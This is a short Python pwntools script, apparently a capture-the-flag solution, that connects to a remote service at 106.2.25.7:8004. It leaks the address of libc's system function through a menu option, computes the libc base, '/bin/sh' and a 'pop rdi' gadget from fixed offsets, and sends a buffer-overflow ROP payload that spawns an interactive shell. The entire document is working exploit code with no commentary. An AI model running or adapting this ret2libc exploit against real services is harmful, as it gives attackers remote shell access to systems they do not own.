from pwn import *
p = remote('106.2.25.7','8004')
p.recvuntil(': ')
p.sendline("2")
p.recvuntil(':')
p.sendline('system')
p.recvuntil('Symbol system: ')
system_addr = p.recvuntil('\n',drop=True)
print("system_addr is " + system_addr)
system_addr = int(system_addr,16)

base_addr = system_addr - 0x45390
sh_addr = base_addr + 0x18cd17
print("sh_addr is: " + str(sh_addr))
pop_rdi_addr = base_addr + 0x21102

payload = 'A'*8 + p64(pop_rdi_addr) + p64(sh_addr) + p64(system_addr)
print("payload "+ str(payload))
p.recvuntil(":")
p.sendline('3')
print('send 3')
p.recvuntil("Enter bytes to send (max 1024): ")
p.sendline("32")
print("send 32")
p.sendline(payload)
print("send payload")
p.interactive()
